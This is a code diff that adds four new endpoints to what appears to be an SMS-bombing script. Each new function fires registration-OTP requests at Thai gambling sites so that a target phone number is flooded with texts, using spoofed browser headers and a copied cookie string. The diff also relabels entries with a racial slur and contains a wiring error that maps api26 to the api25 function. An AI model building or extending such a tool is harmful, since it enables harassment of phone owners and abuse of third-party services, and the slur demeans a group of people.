@@ -35,7 +35,11 @@ api_status = {
     "api19": {"active": True, "cooldown": 0, "notified": False}, # Cueu77778887
     "api20": {"active": True, "cooldown": 0, "notified": False}, # Oneforbet
     "api21": {"active": True, "cooldown": 0, "notified": False}, # Joker123ths
-    "api22": {"active": True, "cooldown": 0, "notified": False}  # Jklmn23456
+    "api22": {"active": True, "cooldown": 0, "notified": False},  # Jklmn23456
+    "api23": {"active": True, "cooldown": 0, "notified": False},
+    "api24": {"active": True, "cooldown": 0, "notified": False},
+    "api25": {"active": True, "cooldown": 0, "notified": False},
+    "api26": {"active": True, "cooldown": 0, "notified": False},
 }
 api_lock = threading.Lock()
 
@@ -325,6 +329,117 @@ def api22(phone):
     except Exception:
         return None, None
 
+def api23(phone):
+    """i828th OTP Request (request-register-tac)"""
+    url = "https://www.i828th.com/api/user/request-register-tac"
+    headers = {
+        "Host": "www.i828th.com",
+        "Connection": "keep-alive",
+        "domain": "www.i828th.com",
+        "sec-ch-ua-platform": "\"Android\"",
+        "lang": "th-th",
+        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
+        "page": "/th-th",
+        "sec-ch-ua-mobile": "?1",
+        "device": "mobile",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+        "accept": "application/json",
+        "content-type": "application/json",
+        "Origin": "https://www.i828th.com",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.i828th.com/th-th?signup=1",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en-US,en;q=0.9,th-TH;q=0.8,th;q=0.7",
+        "Cookie": "prevUrl=https%3A%2F%2Fwww.google.com%2F; ipcountry=TH; _mswin1=fb.1.1753074582459.1245208001; _ga=GA1.1.1963769741.1753074583; click_register_id=reg_btn_5; _tt_enable_cookie=1; _ttp=01K0NP6MMZPFRBM90VZAGE1SE4_.tt.1; _fbp=fb.1.1753074587997.903534775756650704; ttcsid=1753074586284::68daan4eR5wOfWd3OwzM.1.1753074609015; _ga_D8D0PG3DKW=GS2.1.s1753074582$o1$g1$t1753074610$j32$l0$h0; _ga_FXX5V7CMNB=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_F7Y9G4D3H6=GS2.1.s1753074584$o1$g1$t1753074610$j34$l0$h0; _ga_53G0PFB7XN=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_CXCTN5Q7RG=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_1XWRNNZDSV=GS2.1.s1753074586$o1$g1$t1753074610$j36$l0$h0; _ga_8362M6G9PE=GS2.1.s1753074585$o1$g1$t1753074610$j35$l0$h0; _ga_GV9HTY17RV=GS2.1.s1753074586$o1$g1$t1753074611$j35$l0$h0; ttcsid_D17O61BC77UBBP7SA1C0=1753074586281::jfEU0xsdCXsJs8B2_wiM.1.1753074613266"
+    }
+
+    # ตัดรหัสประเทศออกถ้ามี
+    if phone.startswith("+66"):
+        phone = phone[3:]
+    elif phone.startswith("66"):
+        phone = phone[2:]
+
+    data = {
+        "uname": f"66{phone}",
+        "sendType": "mobile",
+        "country_code": "66",
+        "currency": "THB",
+        "mobileno": phone,
+        "language": "th",
+        "langCountry": "th-th"
+    }
+
+    try:
+        response = requests.post(url, headers=headers, json=data, timeout=15)
+        if response.status_code == 200 and '"code":1' in response.text:
+            return response, "N/A"
+        return response, None
+    except Exception:
+        return None, None
+
+def api24(phone):
+    import requests
+    if phone.startswith("+66"): phone = phone[3:]
+    elif phone.startswith("66"): phone = phone[2:]
+    url = "https://www.thai191.com/api/user/request-register-tac"
+    headers = {
+        "user-agent": "Mozilla/5.0",
+        "content-type": "application/json"
+    }
+    data = {
+        "sendType": "mobile",
+        "currency": "THB",
+        "country_code": "66",
+        "mobileno": phone,
+        "language": "th",
+        "langCountry": "th-th"
+    }
+    try:
+        r = requests.post(url, headers=headers, json=data, timeout=15)
+        return r, "N/A" if r.status_code == 200 and '"code":1' in r.text else None
+    except: return None, None
+
+def api25(phone):
+    import requests
+    if phone.startswith("+66"): phone = phone[3:]
+    elif phone.startswith("66"): phone = phone[2:]
+    url = "https://pgs42s.online/api/otp?lang=th"
+    headers = {
+        "user-agent": "Mozilla/5.0",
+        "content-type": "application/json"
+    }
+    data = {
+        "phone_number": phone,
+        "register_type": "",
+        "type_otp": "register"
+    }
+    try:
+        r = requests.post(url, headers=headers, json=data, timeout=15)
+        return r, "N/A" if r.status_code == 200 and '"success"' in r.text else None
+    except: return None, None
+
+def api26(phone):
+    import requests
+    if phone.startswith("+66"): phone = phone[3:]
+    elif phone.startswith("66"): phone = phone[2:]
+    url = "https://pgsoft.pgslotin.app/api/otp"
+    headers = {
+        "user-agent": "Mozilla/5.0",
+        "content-type": "application/json",
+        "origin": "https://pgsoft.pgslotin.app",
+        "referer": "https://pgsoft.pgslotin.app/"
+    }
+    data = {
+        "phone_number": phone,
+        "register_type": ""
+    }
+    try:
+        r = requests.post(url, headers=headers, json=data, timeout=15)
+        return r, "N/A" if r.status_code == 200 and '"success"' in r.text else None
+    except: return None, None
+
 def clean_phone_number(phone):
     """ทำความสะอาดและตรวจสอบเบอร์โทรศัพท์"""
     phone = phone.strip()
@@ -371,8 +486,12 @@ def process_phone_with_api(phone, api_name, success_count):
         "api19": (api19, "Cueu77778887"),
         "api20": (api20, "Oneforbet"),
         "api21": (api21, "Joker123ths"),
-        "api22": (api22, "Jklmn23456")
-    }
+        "api22": (api22, "nigga1"),
+        "api23": (api23, "nigga2"),
+        "api24": (api24, "nigga3"),
+        "api25": (api25, "nigga4"),
+        "api26": (api25, "nigga5"),
+    }  
     
     api_func, api_label = api_map[api_name]
     start_time = time.time()
